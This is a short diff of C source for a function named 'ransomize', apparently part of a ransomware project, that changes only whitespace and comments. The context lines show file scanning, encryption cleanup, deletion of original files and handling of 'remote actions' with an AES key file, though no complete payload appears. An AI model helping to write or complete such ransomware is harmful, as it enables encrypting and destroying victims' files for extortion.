@@ -15,13 +15,13 @@ int ransomize(void)
         printf("Failed to scan files.\n");
         return 1;
     }
-    
+
     // printf("Found %zu files:\n\n", count);
     // for (size_t i = 0; i < count; i++) {
     //     printf("%s\n", paths[i]);
     // }
 
-    /* Cleanup */
+    /* Cleanup of paths*/
     for (size_t i = 0; i < count; i++) {
         free(paths[i]);
     }
@@ -39,7 +39,8 @@ int ransomize(void)
     crypto_cleanup();
 
     /* Delete original files */
-    
+    // In attack_crypto
+
     /* Handle remote actions */
     char aes_key_path[MAX_PATH];
     if (get_relative_path(aes_key_path, sizeof(aes_key_path), "aes_key.bin") == 0) {
